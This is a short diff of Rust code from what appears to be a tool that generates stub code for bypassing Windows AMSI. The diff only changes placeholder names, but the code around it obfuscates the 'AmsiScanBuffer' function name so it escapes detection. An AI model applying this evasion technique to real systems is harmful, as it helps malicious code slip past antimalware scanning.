@@ -38,8 +38,8 @@ impl Params {
             .obfuscate("AmsiScanBuffer")
             .render_stub_expr("amsi_func");
         DEF.stub_fragment
-            .replace("AMSI_DLL_DEF", &amsi_dll)
-            .replace("AMSI_FUNC_DEF", &amsi_func)
+            .replace("$AMSI_DLL_DEF$", &amsi_dll)
+            .replace("$AMSI_FUNC_DEF$", &amsi_func)
     }
 }
 
